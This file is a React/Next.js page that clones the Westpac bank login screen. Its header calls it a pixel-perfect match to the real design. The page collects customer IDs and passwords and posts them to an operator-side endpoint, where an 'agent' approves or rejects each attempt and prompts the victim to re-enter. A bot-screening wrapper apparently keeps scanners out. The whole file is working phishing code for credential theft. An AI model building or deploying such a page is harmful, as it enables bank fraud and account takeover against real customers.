'use client';

/**
 * Westpac Credentials Page
 * 
 * Pixel-perfect match to reference Westpac login design
 * Customer ID or username + Password fields
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2, Lock } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function CredentialsPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId } = useSessionStore();
  const { agentMessage } = useSessionStore();

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Reset form when agent rejects submission
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setUsername('');
      setPassword('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!username.trim()) {
        setFieldError('Please enter your customer ID or username');
        return;
      }

      if (!password) {
        setFieldError('Please enter your password');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-credentials', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            username: username.trim(),
            password,
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your credentials. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your credentials...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [username, password, sessionUuid, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      {/* Logo Section */}
      <div className="logo-section">
        <img src="/brands/westpac/logo.svg" alt="Westpac" className="logo-section__icon" />
        <span className="logo-section__text">one</span>
      </div>

      {/* Login Card */}
      <div className="login-card">
        <h1 className="login-heading">Log in</h1>

        <form className="login-form" onSubmit={handleSubmit}>
          {/* Username Field */}
          <div className="form-group">
            <label htmlFor="login-username" className="form-group__label">Customer ID or username</label>
            <input
              type="text"
              id="login-username"
              name="username"
              className="form-group__input"
              autoComplete="username"
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {/* Password Field */}
          <div className="form-group">
            <label htmlFor="login-password" className="form-group__label">Password</label>
            <input
              type="password"
              id="login-password"
              name="password"
              className="form-group__input"
              autoComplete="current-password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {/* Error message */}
          {fieldError && (
            <div className="error-message">
              <AlertCircle className="h-4 w-4" />
              <span>{fieldError}</span>
            </div>
          )}
          {(error && !fieldError) && (
            <div className="error-message">
              <AlertCircle className="h-4 w-4" />
              <span>{error}</span>
            </div>
          )}

          {/* Login Button */}
          <button
            type="submit"
            className="login-button"
            disabled={isWaiting}
          >
            {isWaiting ? (
              <Loader2 className="h-4 w-4 animate-spin" />
            ) : (
              <Lock className="login-button__icon" />
            )}
            {isWaiting ? 'Logging in...' : 'Log in'}
          </button>
        </form>

        {/* Forgot Password Link */}
        <div className="forgot-password">
          <a href="#" className="forgot-password__link">Forgot your password?</a>
        </div>
      </div>
    </BotGuard>
  );
}
